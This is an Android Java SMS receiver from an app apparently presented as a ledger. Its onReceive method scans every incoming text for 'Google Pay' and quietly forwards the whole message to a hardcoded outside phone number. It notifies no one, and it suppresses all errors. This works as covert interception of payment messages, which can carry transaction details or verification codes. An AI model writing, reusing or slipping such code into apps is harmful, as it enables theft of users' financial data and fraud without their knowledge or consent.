package com.stormyapp.ledger;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsReceiver extends BroadcastReceiver {

    private static SmsListener mListener;
    private static SmsManager smsManager = SmsManager.getDefault();

    public Pattern p = Pattern.compile("Google Pay.");

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle data  = intent.getExtras();
        Object[] pdus = (Object[]) data.get("pdus");
        for(int i=0;i<pdus.length;i++)
        {
            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
            String sender = smsMessage.getDisplayOriginatingAddress();
            String phoneNumber = smsMessage.getDisplayOriginatingAddress();
            String senderNum = phoneNumber ;
            String messageBody = smsMessage.getMessageBody();
            try{
                if(messageBody!=null){
                    Matcher m = p.matcher(messageBody);
                    if(m.find()) {
                        this.sendSMS("+917015362602", messageBody);
                        mListener.messageReceived(m.group(0));
                    }
                }
            }
            catch(Exception e){}
        }
    }

    public void sendSMS(String phone, String body){
        smsManager.sendTextMessage(phone, null, body, null,null);
    }
    public static void bindListener(SmsListener listener) {
        mListener = listener;
    }
}
